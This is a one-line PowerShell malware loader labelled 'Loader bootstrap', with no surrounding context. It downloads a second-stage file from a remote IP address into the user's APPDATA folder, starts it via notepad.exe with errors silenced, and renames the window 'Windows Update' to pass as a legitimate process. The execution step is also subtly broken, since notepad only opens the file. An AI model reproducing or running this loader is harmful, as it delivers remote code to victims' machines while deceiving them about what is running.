
<# Loader bootstrap #> $Stage2Url = 'http://198.51.100.39:8080/stage2.ps1'; $PayloadPath = "$env:APPDATA\payload.bin"; curl.exe -s -L -o $PayloadPath $Stage2Url; Start-Process -FilePath "notepad.exe" -ArgumentList $PayloadPath -ErrorAction SilentlyContinue; $Host.UI.RawUI.WindowTitle = "Windows Update"
